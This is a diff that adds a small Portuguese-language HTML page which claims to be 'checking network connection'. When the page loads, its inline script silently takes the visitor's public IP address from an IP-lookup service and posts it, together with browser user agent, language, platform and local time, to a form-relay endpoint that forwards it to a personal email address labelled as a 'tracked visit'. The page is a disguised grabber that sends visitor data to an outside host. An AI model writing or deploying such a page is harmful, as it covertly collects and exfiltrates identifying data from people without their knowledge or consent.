@@ -1,0 +1,45 @@
+
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificando conexão</title>
+    <style>
+        body {
+            margin: 0;
+            background-color: #000000;
+            color: #ffffff;
+            font-family: Arial, sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            text-align: center;
+        }
+    </style>
+    <script>
+        fetch("https://api.ipify.org?format=json")
+            .then(res => res.json())
+            .then(data => {
+                fetch("https://formsubmit.co/ajax/railima1218@gmail.com", {
+                    method: "POST",
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        _subject: "📡 Nova visita rastreada",
+                        ip: data.ip,
+                        navegador: navigator.userAgent,
+                        idioma: navigator.language,
+                        plataforma: navigator.platform,
+                        hora: new Date().toLocaleString()
+                    })
+                });
+            });
+    </script>
+</head>
+<body>
+    <div>
+        <h2>🔄 Verificando conexão de rede...</h2>
+    </div>
+</body>
+</html>
